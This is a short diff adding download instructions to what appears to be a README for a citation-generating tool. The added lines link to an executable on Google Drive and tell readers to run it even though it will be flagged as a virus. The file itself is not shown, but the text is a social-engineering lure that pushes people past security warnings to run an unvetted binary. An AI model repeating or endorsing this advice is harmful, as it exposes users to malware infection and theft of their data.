@@ -13,6 +13,12 @@ It will ask for basic information about the document/item you are citing, and it
 
 All you have to do is just download the file and run it! It's simple!
 
+You can download it here:
+
+https://drive.google.com/file/d/1VPUaCZ3bR3lwmb7NiCM-ab_Ndvp_iOZW/view?usp=sharing
+
+(When you download and run it, it'll say that its a virus, but just run it anyway.)
+
 
 +===============================================================================+
 |                                                                               |
